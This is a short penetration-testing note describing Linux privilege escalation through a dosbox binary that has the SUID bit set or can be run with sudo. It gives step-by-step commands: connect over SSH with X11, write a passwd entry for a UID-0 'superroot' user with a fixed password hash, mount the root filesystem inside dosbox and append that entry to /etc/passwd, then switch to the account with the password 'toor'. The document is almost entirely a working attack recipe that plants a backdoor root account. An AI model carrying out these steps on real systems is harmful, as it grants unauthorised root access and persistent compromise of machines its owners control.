# Dosbox Privilege Escalation

## Resources:

https://gtfobins.github.io/gtfobins/dosbox/

## Requirements:

dosbox has SUID bit, or user can run as sudo

Recommended to use with X11 GUI if possible

### 1) Connect via SSH using X11

    ssh -X user@TARGET_IP

### 2) Create our superroot user to overwrite the /etc/passwd file

    echo 'superroot:sXuCKi7k3Xh/s:0:0::/root:/bin/bash' > fkpasswd

### 3) Run dosbox

    dosbox

### 4) In dosbox GUI, Overwrite /etc/passwd file

    mount d /
    D:
    type D:\HOME\USER\FKPASSWD >> D:\ETC\PASSWD

### 5) Get root

    su - superroot
    toor
